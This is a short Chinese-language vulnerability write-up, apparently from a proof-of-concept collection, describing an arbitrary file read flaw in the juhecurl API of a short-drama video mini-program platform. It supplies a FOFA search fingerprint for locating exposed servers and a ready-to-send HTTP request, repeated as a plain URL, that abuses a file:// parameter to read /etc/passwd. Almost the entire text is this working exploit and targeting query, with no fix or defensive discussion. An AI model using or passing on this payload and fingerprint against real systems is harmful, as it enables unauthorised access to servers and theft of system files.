## 短剧影视小程序平台juhecurl接口存在任意文件读取漏洞

## 一、漏洞简介
短剧影视小程序平台juhecurl接口存在任意文件读取漏洞

## fofa
```
"VwmRIfEYDH.php"
```

## POC
```
GET /api/ems/juhecurl?url=file:///etc/passwd HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

## POC
```
漏洞链接：http://xx.xx.xx.xx/api/ems/juhecurl?url=file:///etc/passwd
```
